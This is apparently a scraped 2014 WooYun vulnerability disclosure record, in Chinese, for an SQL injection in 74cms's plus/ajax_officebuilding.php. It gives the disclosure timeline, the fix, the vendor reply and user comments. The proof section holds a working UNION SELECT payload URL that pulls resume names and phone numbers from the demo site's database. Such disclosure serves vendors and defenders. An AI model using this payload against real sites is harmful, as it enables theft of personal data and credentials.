{"id": 4709, "wybug_id": "wooyun-2014-052174", "wybug_title": "骑士cms注射漏洞可获取简历及账号密码", "wybug_corp": "74c,s.com", "wybug_author": "hash", "wybug_date": "2014-03-06 10:45", "wybug_open_date": "2014-04-20 10:45", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "6", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-20：\t细节向公众公开  简要描述：  详细说明：  plus/ajax_officebuilding.php 页面key值没有过滤，导致注入问题，通过此漏洞可以获取所有用户简历、企业资料、用户后台账号密码，整个数据库的资料都可以获取。打开plus/ajax_officebuilding.php可以看到，key值没有进行任何过滤。直接进行sql查询。\n\n由于骑士系统密码的加密hash不能获取，所以此漏洞只能获取用户资料，不能获取网站shell，此漏洞危害等级不高。   漏洞证明：  骑士演示站的数据注入代码：\nhttp://demo.74cms.com/plus/ajax_officebuilding.php?act=key&key=s%E9%8C%A6%27%20or%201=1%20union%20select%201,2,3,concat(0x3C2F613E20),5,6,7,concat(0x3C623E5E5F5E203C2F623E,id,fullname,telephone,0x3C623E205E5F5E3C2F623E),9%20from%20qs_resume%23\n用户简历资料：\n\n网站后台账号、密码\n\n   修复方案：  过滤key值。   版权声明：转载请注明来源 hash@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-03-06 11:33 厂商回复： 感谢您对官方的支持，我们会尽快修复此漏洞！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-06 11:10 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  路人甲好牛逼，哈哈，可以的话交流下    \n     2014-03-06 12:13 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @骑士人才系统 新来的厂商还是厂商瞬间复活？    \n     2014-03-06 17:19 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @hash 大牛，可以加个QQ聊聊吗~    \n     2014-03-07 14:58 |    \t\thash \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:1        | SQL注入ing...)\t\t \n  @寂寞的瘦子 可以啊。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}